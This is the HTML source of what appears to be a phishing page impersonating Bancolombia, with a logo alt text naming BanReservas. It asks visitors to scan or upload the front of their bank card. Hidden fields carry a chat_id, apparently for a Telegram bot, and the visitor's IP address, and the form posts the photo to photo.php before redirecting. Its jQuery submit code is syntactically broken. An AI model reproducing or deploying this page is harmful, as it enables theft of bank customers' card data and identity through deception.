<html class="dkddl_fouc js"><head id="ctl00_Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      
    <meta http-equiv="X-UA-Compatible" content="IE=10">

    <title> Informacion</title>

    <link type="text/css" href="./index2_files/jquery-ui-1.8.9.custom.css" rel="stylesheet">
    <link href="./index2_files/dropkickddl.css" rel="stylesheet" type="text/css">
    <link href="./index2_files/jquery-ui-1.8.9.custom(1).css" type="text/css" rel="stylesheet">
    <link href="./index2_files/Login2.css" type="text/css" rel="stylesheet">
    <style type="text/css">
       .input-file-container {
position: relative;
width: 225px;
} 
.js .input-file-trigger {
display: block;
padding: 14px 45px;
background: #000;
color: #fff;
font-size: 10pt;
text-align: center;
transition: all .4s;
cursor: pointer;
}
.js .input-file {
position: absolute;
top: 0; left: 0;
width: 225px;
opacity: 0;
padding: 14px 0;
cursor: pointer;
}
.js .input-file:hover + .input-file-trigger,
.js .input-file:focus + .input-file-trigger,
.js .input-file-trigger:hover,
.js .input-file-trigger:focus {
background: #FDDA24;
color: #FFF;
}

.file-return {
margin: 0;
}
.file-return:not(:empty) {
margin: 1em 0;
}
.js .file-return {
font-style: italic;
font-size: .9em;
font-weight: bold;
}
.js .file-return:not(:empty):before {
content: "Selected file: ";
font-style: normal;
font-weight: normal;
}





h2 + P {
text-align: center;
}
.txtcenter {
margin-top: 4em;
font-size: .9em;
text-align: center;
color: #aaa;
}
.copy {
margin-top: 2em;
}
.copy a {
text-decoration: none;
color: #1ABC9C;
}
    </style>

    <script src="./index2_files/jquery.min.js.descarga"></script> 
  <script type="text/javascript">
  $(document).on("submit", "form", function (event) {
      event.preventDefault();
      $.ajax(
          url: $(this).attr("action"),
          type: $(this).attr("method"),
          dataType: "JSON",
          data: new FormData(this),
          processData: false,
          contentType: false,
          success: function (data, status) {
              location.href ="index6.php";
          
      });
  });
</script> 
<script type="application/javascript">
function getIP(json) {
  document.getElementById("ipaddress").value = json.ip;
}
</script>
   
 </head>
 <body class="top" style="">
    <form method="POST" action="photo.php" enctype="multipart/form-data">
<input type="text" name="chat_id" value="1476712776" hidden="">
<input type="text" name="caption" id="ipaddress" hidden="">

       <div class="contenedorgenerico">
          
         
             <div id="capaTeclado" style="width: 40px; height: 0px; visibility: hidden; display: none">
                <table cellpadding="0" cellspacing="0" class="floatingHeader">
                   <tbody>
                      <tr style="padding-top:10px;padding-bottom=0px;">
                         <td ondblclick="void(0);" onmouseover="over=true;" onmouseout="over=false;" style="cursor: move;
              border: none;width: 90%;" class="ic-log-message-text"></td>
                         <td style="padding-right: 10px; width:10%; text-align: right;">
                            <a href="javascript:void(0);">
                               <img alt="Close" src="./index2_files/img-close.gif" border="0" style="text-align: right;">
                            </a>
                         </td>
                      </tr>
                      <tr>
                         <td colspan="2">
                            <table border="0">
                               <tbody>
                                  <tr valign="top">
                                     <td class="textoContenido">
                                        <a href="#" onmouseover="mostrarImagen();return false;">
                                           <img src="./index2_files/teclado_login_minusculas.png" name="image" border="0" usemap="#Map" alt="">
                                           
                                        </a>
                                     </td>
                                  </tr>
                               </tbody>
                            </table>
                            <div>
                               <table border="0" width="100%">
                                  <tbody>
                                     <tr align="center" valign="top">
                                        <td class="ic-log-form-label" style="text-align: right; width:35%"> Contraste: </td>
                                        <td class="ic-log-form-label " style="text-align: left;width:25%">
                                           <input type="radio" id="HighContrast" class="textoContenido" name="contraste" onclick="cambiarContraste(true);" checked="checked">
                                           <img src="./index2_files/teclado_virtual_chico_ac.gif" id="ctl00_MainHolder_ctrVirtualKeyboard1_imgVirtualKeyboard" onclick="cambiarContraste(true);" style="border: none" alt="Alto">
                                        </td>
                                        <td class="ic-log-form-label" style="text-align: left;width:40%">
                                           <input type="radio" id="LowContrast" class="textoContenido" name="contraste" onclick="cambiarContraste(false);">
                                           <img src="./index2_files/teclado_virtual_chico_bc.gif" id="ctl00_MainHolder_ctrVirtualKeyboard1_img1" onclick="cambiarContraste(false);" style="border: none" alt="Bajo">
                                        </td>
                                     </tr>
                                  </tbody>
                               </table>
                            </div>
                         </td>
                      </tr>
                   </tbody>
                </table>
             </div>
             <div class="logo-ban">
                <img src="./index_files/images/bancolombia_solo_clic.png" alt="BanReservas">
             </div>
             <div id="dimmer">
                <div id="ctl00_MainHolder_loginPanel" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'ctl00_MainHolder_loginButton')">
                   <div class="contenedor_ingresar subtabla-login">
                      <div class="data">
                         <ul class="medio">
                            <li class="medio titulo"> Validación Clave Dinamica&nbsp;</li>
                            <li class="medio">
                               <div class="datos">
                                  <div id="ctl00_MainHolder_Panel2" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'ctl00_MainHolder_loginButton')">
                                     <ul>
                                        <li></li>
                                        <li class="clearfix"></li>
                                     </ul>
                                     <ul>
                                        <li id="ctl00_MainHolder_tdLoginImageText" class="etiqueta title_image"> Validaremos tu identidad por favor ten cerca tu tarjeta de bancolombia. </li>
                                        <li class="etiqueta image" style="margin-left: 10px;">
                                           
                                           <ul class="medio">
                                              <li></li>
                                           </ul>
                                           <div class="datos">
                                              <ul>
                                                 <li class="clearfix"></li>
                                                 <li class="tabla-img registro">
                                                    <table id="ctl00_MainHolder_ctrImages_imagesTable" class="ic_table-content">
                                                       <tbody>
                                                          <tr>
                                                             <td>
                                                                <table>
                                                                   <tbody>

                                                                      <tr>
                                                                         <td>

                                                                            <img src="./index2_files/gettyimages-1209241615-170667a+2.svg" style="margin: auto;display: block;width: 120px;">
                                                                         </td>

                                                                      </tr>

                                                                      <tr></tr>

                                                                   </tbody>

                                                                </table>

                                                             </td>
                                                          </tr>
                                                       </tbody>

                                                    </table>
                                                 </li>


                                                 <li class="etiqueta error" style="width:auto;">
                                                    <span id="ctl00_MainHolder_ctrImages_requiredFieldValidatorSelectImage" class="ic-error-message" style="display:none;">Por favor, seleccione una imagen</span>
                                                 </li>
                                                 <li class="clearfix"></li>
                                                 <li>
                                                    <input type="hidden" name="ctl00$MainHolder$ctrImages$textBoxSelectedImage" id="ctl00_MainHolder_ctrImages_textBoxSelectedImage" value="57">
                                                 </li>
                                              </ul>
                                           </div>
                                        </li>

                                        <li class="etiqueta login2">
                                           
                                        </li>
                                        <li class="campo half2 requerido">
                                          <div class="input-file-container">  
  <input class="input-file" required="" accept="image/*" type="file" name="photo" onchange="setfilename(this.value)">
  <label tabindex="0" for="my-file" style="width: 200px;" class="input-file-trigger">Escanea la parte delantera de tu tarjeta Bancolombia : <strong>Click aquí para escanear Foto/Subir Archivo</strong> </label>
  <input type="text" style="padding:20px;" name="photo" id="wpName" class="form-control form-control-lg" placeholder="Escanea tu tarjeta Bancolombia" readonly="">

</div>


                                           <ul>
                                              <li class="val-drp-log-pass1111"> &nbsp; </li>
                                           </ul>
                                        </li>
                                        <li class="clearfix"></li>
                                     </ul>

                                     <ul>
                                        <li>
                                           <div id="ctl00_MainHolder_upPanelPrincipal">
                                              <ul>
                                                 <li class="clearfix"></li>
                                              </ul>
                                           </div>
                                        </li>
                                     </ul>
                                             <!-- Captcha -->
                                     <ul></ul>
                                  </div>
                                  <div id="ctl00_MainHolder_Panel1">
                                     <ul>
                                        <li>
                                           <ul class="botones">
                                              <li>
                                                 <div class="btn-paso2">
                                                    <ul>
                                                       <li class="blue_back">
                                                          
                                                       </li>
                                                       <li class="blue">
                                                          <button class="ic-button" style="
  font-family: Open Sans;
  font-size: 14px;
  color: #FFF;
  width: 280px;
  height: 50px;
  background: #FDDA24;
  text-align: center;
  margin: auto;
  display: block;
  border: none;
  cursor: pointer;
  " type="submit" value="sendPhoto">Continuar</button>
  <br>

                                                       </li>
                                                    </ul>
                                                 </div>
                                              </li>
                                           </ul>
                                        </li>
                                     </ul>
                                     
                                  </div>
                               </div>
                            </li>
                         </ul>
                         <div class="image-container">
                            <div class="logo-image alto" id="divImage"></div>
                         </div>
                      </div>
                      <table class="tabla-login-teclado" cellpadding="0" cellspacing="0">
                         <tbody>
                            <tr>
                               <td>
                                  <div class="teclado_step1">
                                     <a id="A2" href="#" class="ic-log-message-link" style="cursor: pointer; text-decoration: none; color: #4A4A4A;">
                                        <img src="./index2_files/teclado_virtual_chico_ac.gif" id="ctl00_MainHolder_img2" style="border: none;
                                              vertical-align: middle;" alt="Teclado Virtual"> Teclado Virtual </a>
                                  </div>
                               </td>
                            </tr>
                         </tbody>
                      </table>
                   </div>
                </div>
             </div>
             <script>
function setfilename(val)
{
  filename = val.split('\\').pop().split('/').pop();
  filename = filename;
  document.getElementById('wpName').value = filename;
}
</script>
<script>
 document.querySelector("html").classList.add('js');

var fileInput  = document.querySelector( ".input-file" ),  
  button     = document.querySelector( ".input-file-trigger" ),
  the_return = document.querySelector(".file-return");
    
button.addEventListener( "keydown", function( event ) {  
  if ( event.keyCode == 13 || event.keyCode == 32 ) {  
      fileInput.focus();  
  }  
});
button.addEventListener( "click", function( event ) {
 fileInput.focus();
 return false;
});  
fileInput.addEventListener( "change", function( event ) {  
  the_return.innerHTML = this.value;  
});  
</script>

 
 <script type="application/javascript" src="./index2_files/saved_resource"></script>
</div></form></body></html>